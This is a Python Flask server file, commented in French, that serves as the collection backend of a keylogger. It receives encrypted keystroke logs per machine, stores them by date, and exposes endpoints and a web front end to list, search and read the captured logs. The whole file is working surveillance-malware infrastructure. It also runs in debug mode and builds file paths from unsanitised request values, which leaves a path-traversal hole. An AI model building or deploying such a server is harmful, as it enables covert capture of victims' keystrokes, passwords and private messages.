# -*- coding: utf-8 -*-
from flask import Flask, jsonify, request, send_from_directory, redirect, url_for
import time
from pathlib import Path

# --------------------------------
# Configuration des chemins
# --------------------------------
BASE_DIR    = Path(__file__).resolve().parent          # dossier server/
CLIENT_DIR  = (BASE_DIR.parent / "client").resolve()   # dossier client/
DATA_FOLDER = BASE_DIR / "data"                        # data stockées dans server/data/
DATA_FOLDER.mkdir(parents=True, exist_ok=True)

SECRET_KEY = "avi"   # la vraie clé reste côté agent / front
PORT = 5001

app = Flask(__name__)

# --------------------------------
# Route par défaut
# --------------------------------
@app.route("/")
def home():
    return "KeyLogger Server is Running (chiffrement côté client uniquement)"

# --------------------------------
# API: enregistrement (chiffré uniquement)
# --------------------------------
@app.route("/api/save_data", methods=["POST"])
def save_data():
    data = request.get_json(silent=True) or {}
    machine = str(data.get("machine_name", "")).strip()
    cipher  = str(data.get("data", "")).strip()

    if not machine or not cipher:
        return jsonify({"error": "machine_name and data required"}), 400

    # Préfixer si besoin
    if not cipher.startswith("ENC:"):
        cipher = "ENC:" + cipher

    # Créer dossier machine
    machine_dir = DATA_FOLDER / machine
    machine_dir.mkdir(parents=True, exist_ok=True)

    # Fichier par date
    date_str = time.strftime("%Y-%m-%d")
    file_path = machine_dir / f"log_{date_str}.txt"
    ts = time.strftime("[%Y-%m-%d %H:%M:%S]")

    # Écrire en l'état
    with open(file_path, "a", encoding="utf-8") as f:
        f.write(f"{ts}\t{cipher}\n")

    return jsonify({"status": "success", "file": str(file_path)}), 200

# --------------------------------
# API: recherche (renvoie données chiffrées)
# --------------------------------
@app.route("/api/search", methods=["GET"])
def search_logs():
    """
    Renvoie des lignes BRUTES (toujours chiffrées) selon machine/date.
    Le filtrage par mots-clés se fera côté front après déchiffrement.
    """
    machine = (request.args.get("machine_name") or "").strip()
    date_str = (request.args.get("date") or "").strip()

    results = []
    files_to_check = []

    if machine:
        machine_dir = DATA_FOLDER / machine
        if not machine_dir.is_dir():
            return jsonify({"count": 0, "results": []}), 200
        if date_str:
            files_to_check.append(machine_dir / f"log_{date_str}.txt")
        else:
            files_to_check.extend(sorted(machine_dir.glob("log_*.txt")))
    else:
        for machine_dir in sorted(DATA_FOLDER.glob("*")):
            if machine_dir.is_dir():
                if date_str:
                    files_to_check.append(machine_dir / f"log_{date_str}.txt")
                else:
                    files_to_check.extend(sorted(machine_dir.glob("log_*.txt")))

    for path in files_to_check:
        if path.exists():
            machine_name = path.parent.name
            log_date     = path.stem.replace("log_", "")
            with open(path, "r", encoding="utf-8") as f:
                for line in f:
                    L = line.rstrip("\n")  # ex: "[2025-09-09 11:05:02]\tENC:...."
                    results.append({"machine": machine_name, "date": log_date, "line": L})

    return jsonify({"count": len(results), "results": results}), 200
# --------------------------------
# API: liste des machines
# --------------------------------
@app.route("/api/machines", methods=["GET"])
def list_machines():
    machines = []
    if DATA_FOLDER.is_dir():
        for d in sorted(DATA_FOLDER.iterdir()):
            if d.is_dir():
                machines.append(d.name)
    return jsonify({"machines": machines}), 200

# --------------------------------
# API: liste des dates pour une machine
# --------------------------------
@app.route("/api/dates", methods=["GET"])
def list_dates_for_machine():
    machine = (request.args.get("machine_name") or "").strip()
    if not machine:
        return jsonify({"error": "machine_name required"}), 400

    machine_dir = DATA_FOLDER / machine
    if not machine_dir.is_dir():
        return jsonify({"machine": machine, "dates": []}), 200

    dates = [p.stem.replace("log_", "") for p in machine_dir.glob("log_*.txt")]
    dates.sort(reverse=True)
    return jsonify({"machine": machine, "dates": dates}), 200

# --------------------------------
# API: lire contenu brut (chiffré) d'un fichier
# --------------------------------
@app.route("/api/log", methods=["GET"])
def read_single_log():
    machine = (request.args.get("machine_name") or "").strip()
    date_str = (request.args.get("date") or "").strip()
    if not machine or not date_str:
        return jsonify({"error": "machine_name and date required"}), 400

    file_path = DATA_FOLDER / machine / f"log_{date_str}.txt"
    if not file_path.exists():
        return jsonify({"machine": machine, "date": date_str, "lines": []}), 200

    with open(file_path, "r", encoding="utf-8") as f:
        lines = [line.rstrip("\n") for line in f]
    return jsonify({"machine": machine, "date": date_str, "lines": lines}), 200

# --------------------------------
# Routes pour servir le front (client/)
# --------------------------------
@app.route("/client/")
@app.route("/client/<path:filename>")
def serve_client(filename="index.html"):
    return send_from_directory(str(CLIENT_DIR), filename)

@app.route("/client")
def serve_client_no_slash():
    return redirect(url_for("serve_client"))

@app.route("/search")
def alias_search():
    return send_from_directory(str(CLIENT_DIR), "search.html")

@app.route("/manager")
def alias_manager():
    return send_from_directory(str(CLIENT_DIR), "manager.html")

@app.route("/log")
def alias_log():
    return send_from_directory(str(CLIENT_DIR), "log.html")

# --------------------------------
# Run server
# --------------------------------
if __name__ == "__main__":
    print(f"🚀 Flask running on http://127.0.0.1:{PORT}")
    app.run(debug=True, port=PORT)